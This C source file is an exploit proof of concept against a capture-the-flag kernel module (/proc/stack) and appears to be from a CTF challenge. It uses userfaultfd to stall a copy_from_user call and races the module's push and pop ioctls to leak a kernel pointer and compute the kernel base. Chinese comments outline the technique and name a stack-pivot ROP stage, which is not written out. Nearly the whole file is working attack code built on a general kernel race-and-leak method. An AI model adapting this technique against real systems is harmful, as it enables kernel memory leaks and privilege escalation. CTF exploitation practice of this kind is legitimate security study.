//basic
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/syscall.h>
//multi-thread
#include <pthread.h>
#include <fcntl.h>
#include <stdbool.h>
#include <signal.h>
//userfault-fd
#include <linux/userfaultfd.h>
#include <poll.h>

#define CMD_PUSH 0x57ac0001
#define CMD_POP 0x57ac0002

//结构体长度：32
typedef struct _Element
{
	int owner;
	unsigned long value;
	struct _Element *fd;
} Element;

int g_fd = -1;
unsigned long g_kernel_base = 0;
static char *g_fault_page = NULL;
void * fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    int page_size = sysconf(_SC_PAGE_SIZE);
    uffd = (long) arg;

    /* Loop, handling incoming events on the userfaultfd
        file descriptor */
    
    for (;;) 
    {
        /* See what poll() tells us about the userfaultfd */

        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        /*
         * 当 poll 返回时说明出现了缺页异常
         * 你可以在这里插入一些自定义的代码，比如说获取锁或者 sleep() 一类的操作
         * 让他在你想要的地方停顿，之后你再手动唤醒（或者就这样卡住）
         */
        //此时copy_from_user被我们卡住了，执行CMD_POP/copy_to_user来竞争tmp->value中的数据即可leak
        unsigned long leak_data[4];
        ioctl(g_fd, CMD_POP, leak_data);
        printf("[*] kernel leaked: %lx\n", leak_data[0]);
        g_kernel_base = leak_data[0] - 1293952;
        printf("[*] kernel base: %lx\n", g_kernel_base);
        if (nready == -1)
            perror("[!] poll\n");

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0)
        {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }
        if (nread == -1) {
            perror("[!] read");
        }
        /* We expect only one kind of event; verify that assumption */

        if (msg.event != UFFD_EVENT_PAGEFAULT)
        {
            printf("[!] Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        uffdio_copy.src = (unsigned long) g_fault_page;

        /* We need to handle page faults in units of pages(!).
        So, round faulting address down to page boundary */

        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            perror("[!] ioctl-UFFDIO_COPY");
    }
    return NULL;
}


void test_leaked() { //0x20
    char buf[10];
    int victim = open("/proc/self/stat", O_RDONLY);
    if(-1 == victim) {
        perror("[!] test_leaked open");
    }
    read(victim, buf, 1); // call start
    close(victim); //free
}

/* debug
gdb -q -ex "set architecture i386:x86-64:intel" -ex "target remote localhost:3234" -ex='b * 0xffffffffc0000000+0xA7' -ex='add-symbol-file ./kstack.ko 0xffffffffc0000000'
gdb -q -ex "set architecture i386:x86-64:intel" -ex "target remote localhost:3234" -ex='b * 0xffffffff81000000+0x001dd06' -ex='add-symbol-file ./gnote.ko 0xffffffffc0000000'
*/

int main(int argc, char **argv[]) {
    
    g_fault_page = (char *)malloc(0x1000); 
    
    g_fd = open("/proc/stack", O_RDWR);
    if(-1 == g_fd) {
        perror("[!] stack open");
    }
    
    printf("[+] start poc\n");

    // 1.首先通过 userfault-fd 系统调用注册一个 userfault-fd

    long  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); //#include <sys/syscall.h>
    if (uffd == -1) {
        perror("[!] userfaultfd\n");
    }
    // 2. 配置相关的结构体
    struct uffdio_api uffdio_api;
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
       perror("[!] ioctl-UFFDIO_API\n");
    }

    // 3. 分配一个匿名内存空间，由于是匿名空间且没有使用过，他没有对应的物理空间，在第一次使用时会触发缺页异常，内核才会给他分配对应的物理页
    size_t len = 0x1000;
    char *addr = (char*) mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED) {
        perror("[!] mmap\n");
    }

    //4. 为分配的这块内存区域注册 userfault-fd
    struct uffdio_register uffdio_register;
    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
        perror("[!] ioctl-UFFDIO_REGISTER\n");
    }


    //5. 启动 monitor 轮询线程，整个 userfaultfd 的启动流程就结束了，接下来便是等待缺页异常的过程
    pthread_t thr;
    int s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        perror("[!]pthread_create\n");
    }

    //6. 构造触发缺页异常 + 竞争 leak，刚好0x20 还是用seq_operations的老办法
    test_leaked();
    printf("[+] PUSH-POP race build\n");
    ioctl(g_fd, CMD_PUSH, addr);
    printf("[+] the end\n");

    //7. 题目没有SMAP所以还是可以用栈迁移+ROP的通用模板进行利用
    //target = 0xffffffff81256ee5
    return 0;
    
}